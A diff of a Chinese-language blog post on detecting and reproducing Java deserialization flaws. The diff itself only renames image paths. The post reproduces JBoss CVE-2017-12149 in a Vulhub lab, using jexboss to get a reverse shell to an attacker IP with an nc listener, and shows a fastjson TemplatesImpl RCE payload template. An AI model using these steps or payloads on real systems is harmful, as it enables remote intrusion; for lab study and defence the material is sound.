@@ -178,15 +178,15 @@
 <p>通常情况下，DNS解析请求是最有可能绕过企业防火墙，因此是一个相当好的检测方法。在一般情况下，定时方法是更可靠和更可取的，但DNS方法可以适合用于 不稳定的系统或高度延迟的网络。</p>
 <p>CPU检测方法是基于Wouter Coekaerts”serialdos工作：没有任何脆弱的系统检测反序列化问题。有效载荷是基于一个系统对象（java util。HashSet），采用多CPU周期为反序列化任务。SerialDOS是创建一个POC的拒绝服务（DOS）攻击，但通过降低CPU周期需要反序列化它也可以用来作为一种检测方法。这个有效载荷是检测如果应用程序终结点实际上执行java反序列化，如果严格执行白名单的方法很有用。如果检查出阳性结果也有目标应用实施白名单的方式，允许HashSet类java.util包的可能性。在这种情况下，应用程序仍然容易受到DoS攻击。</p>
 <p>检测集成在Burp Suite的主动和被动的扫描器，在这里首先好下载ysoserial，并且将地址填入Exploiting configutation中</p>
-<p><img src="/article/Java反序列化检测及漏洞复现/1568624169749.png" alt="1568624169749"></p>
+<p><img src="/article/a6638bb3/1568624169749.png" alt="1568624169749"></p>
 <p>配置好后，burp可以在扫描时自动识别java反序列化漏洞，如图所示</p>
-<p><img src="/article/Java反序列化检测及漏洞复现/1568624511240.png" alt="1568624511240"></p>
+<p><img src="/article/a6638bb3/1568624511240.png" alt="1568624511240"></p>
 <p>或者也可以手动进行测试，首先将测试的请求发送到DS-Manual testing</p>
-<p><img src="/article/Java反序列化检测及漏洞复现/1568624605111.png" alt="1568624605111"></p>
+<p><img src="/article/a6638bb3/1568624605111.png" alt="1568624605111"></p>
 <p>然后打开burp标签栏上的Deserialization Scanner，选择插入点、测试方式并开始测试</p>
-<p><img src="/article/Java反序列化检测及漏洞复现/444-22-54.png" alt="444-22-54"></p>
+<p><img src="/article/a6638bb3/444-22-54.png" alt="444-22-54"></p>
 <p>测试结果将显示在右侧</p>
-<p><img src="/article/Java反序列化检测及漏洞复现/258-24-17.png" alt="258-24-17"></p>
+<p><img src="/article/a6638bb3/258-24-17.png" alt="258-24-17"></p>
 <p>当然，这个插件也有漏洞利用的功能，这里先不介绍了</p>
 <h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><h3 id="JBoss-5-x-6-x-反序列化漏洞（CVE-2017-12149）复现"><a href="#JBoss-5-x-6-x-反序列化漏洞（CVE-2017-12149）复现" class="headerlink" title="JBoss 5.x/6.x 反序列化漏洞（CVE-2017-12149）复现"></a>JBoss 5.x/6.x 反序列化漏洞（CVE-2017-12149）复现</h3><blockquote>
 <p>靶机:kali    ip:192.168.31.7</p>
@@ -195,24 +195,24 @@
 <h4 id="漏洞介绍"><a href="#漏洞介绍" class="headerlink" title="漏洞介绍"></a>漏洞介绍</h4><p>该漏洞为 Java反序列化错误类型，存在于 Jboss 的 HttpInvoker 组件中的 ReadOnlyAccessFilter 过滤器中。该过滤器在没有进行任何安全检查的情况下尝试将来自客户端的数据流进行反序列化，从而导致了漏洞。</p>
 <h4 id="检测方法"><a href="#检测方法" class="headerlink" title="检测方法"></a>检测方法</h4><p>该漏洞出现在 <strong>/invoker/readonly</strong> 请求中，服务器将用户提交的POST内容进行了Java反序列化；</p>
 <p>访问<code>https://xxx.xxxxxx.xxx/invoker/readonly</code>如果页面返回500一般是存在了；</p>
-<p><img src="/article/Java反序列化检测及漏洞复现/1567395869035.png" alt="1567395869035"></p>
+<p><img src="/article/a6638bb3/1567395869035.png" alt="1567395869035"></p>
 <h4 id="启动测试环境"><a href="#启动测试环境" class="headerlink" title="启动测试环境"></a>启动测试环境</h4><blockquote>
 <p><a href="https://vulhub.org" target="_blank" rel="noopener">Vulhub</a>是一个面向大众的开源漏洞靶场，无需docker知识，简单执行两条命令即可编译、运行一个完整的漏洞靶场镜像。旨在让漏洞复现变得更加简单，让安全研究者更加专注于漏洞原理本身。</p>
 </blockquote>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/vulhub/vulhub.git	#下载环境	</span><br><span class="line">cd vulhub/jboss/CVE-2017-12149	#进入相关漏洞的目录</span><br><span class="line">docker-compose up -d	#启动</span><br></pre></td></tr></table></figure>
 <p>访问靶机ip:8080 出现如下页面说明启动成功</p>
-<p><img src="/article/Java反序列化检测及漏洞复现/1567395018129.png" alt="1567395018129"></p>
+<p><img src="/article/a6638bb3/1567395018129.png" alt="1567395018129"></p>
 <h4 id="攻击演示"><a href="#攻击演示" class="headerlink" title="攻击演示"></a>攻击演示</h4><h4 id="使用java反序列化终极测试工具"><a href="#使用java反序列化终极测试工具" class="headerlink" title="使用java反序列化终极测试工具"></a>使用java反序列化终极测试工具</h4><p>使用<strong>java反序列化终极测试工具</strong>,输入目标地址，首先获取信息，查看是否存在漏洞，如果存在漏洞可以直接执行命令，简单又好用</p>
-<p><img src="/article/Java反序列化检测及漏洞复现/111.png" alt="1567398716662"></p>
+<p><img src="/article/a6638bb3/111.png" alt="1567398716662"></p>
 <h4 id="使用Jexboss"><a href="#使用Jexboss" class="headerlink" title="使用Jexboss"></a>使用Jexboss</h4><blockquote>
 <p>jexboss是一个使用Python编写的Jboss漏洞检测利用工具，通过它可以检测并利用web-console，jmx-console，JMXInvokerServlet这三个漏洞，并且可以获得一个shell。</p>
 </blockquote>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/joaomatosf/jexboss.git</span><br><span class="line">cd jexboss</span><br><span class="line">python jexboss.py -host http://192.168.31.7:8080</span><br></pre></td></tr></table></figure>
-<p><img src="/article/Java反序列化检测及漏洞复现/1567416611533.png" alt="1567416611533"></p>
+<p><img src="/article/a6638bb3/1567416611533.png" alt="1567416611533"></p>
 <p>接着输入</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">No</span><br><span class="line">yes</span><br><span class="line">192.168.31.116 #攻击机ip</span><br><span class="line">9999 #攻击机监听端口</span><br><span class="line"><span class="meta">#</span><span class="bash">打开新的窗口 设置监听</span></span><br><span class="line">nc -l -p 9999 -vv</span><br></pre></td></tr></table></figure>
 <p>按下回车后再在nc监听窗口按一下回车获得反弹的shell，这种方式获得的shell一般权限都比较高。</p>
-<p><img src="/article/Java反序列化检测及漏洞复现/qqq.png" alt="1567416447170"></p>
+<p><img src="/article/a6638bb3/qqq.png" alt="1567416447170"></p>
 <h3 id="fastjson-反序列化导致任意命令执行漏洞"><a href="#fastjson-反序列化导致任意命令执行漏洞" class="headerlink" title="fastjson 反序列化导致任意命令执行漏洞"></a>fastjson 反序列化导致任意命令执行漏洞</h3><blockquote>
 <p>2017年3月15日，fastjson官方发布安全公告表示fastjson在1.2.24及之前版本存在远程代码执行高危安全漏洞。攻击者可以通过此漏洞远程执行恶意代码来入侵服务器。fastjson官方建议直接升级到1.2.28/1.2.29或者更新版本来保证系统安全。</p>
 </blockquote>
@@ -253,11 +253,11 @@
 <p>生成后放到如下位置中</p>
 <figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="attr">"@type"</span>:<span class="string">"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl"</span>,<span class="attr">"_bytecodes"</span>:[<span class="string">"放到这里"</span>],<span class="attr">"_name"</span>:<span class="string">"a.b"</span>,<span class="attr">"_tfactory"</span>:&#123; &#125;,<span class="attr">"_outputProperties"</span>:&#123; &#125;,<span class="attr">"_version"</span>:<span class="string">"1.0"</span>,<span class="attr">"allowedProtocols"</span>:<span class="string">"all"</span>&#125;</span><br></pre></td></tr></table></figure>
 <h4 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><p>正常访问Hello World  抓包，构造一个POST数据提交，目标会提取json对象中的name和age拼接成一句话返回。</p>
-<p><img src="/article/Java反序列化检测及漏洞复现/1567672160067.png" alt="1567672160067"></p>
+<p><img src="/article/a6638bb3/1567672160067.png" alt="1567672160067"></p>
 <p>接下在发送构造的poc发送</p>
-<p><img src="/article/Java反序列化检测及漏洞复现/1568635189550.png" alt="1568635189550"></p>
+<p><img src="/article/a6638bb3/1568635189550.png" alt="1568635189550"></p>
 <p>可以看到执行成功了</p>
-<p><img src="/article/Java反序列化检测及漏洞复现/1568635178053.png" alt="1568635178053"></p>
+<p><img src="/article/a6638bb3/1568635178053.png" alt="1568635178053"></p>
 <h2 id="reference"><a href="#reference" class="headerlink" title="reference"></a>reference</h2><p><a href="http://xxlegend.com/2018/06/20/先知议题 Java反序列化实战 解读/" target="_blank" rel="noopener">http://xxlegend.com/2018/06/20/先知议题 Java反序列化实战 解读</a></p>
 <p><a href="https://xz.aliyun.com/t/496" target="_blank" rel="noopener">https://xz.aliyun.com/t/496</a></p>
 <p><a href="https://mp.weixin.qq.com/s/nYY4zg2m2xsqT0GXa9pMGA" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/nYY4zg2m2xsqT0GXa9pMGA</a></p>
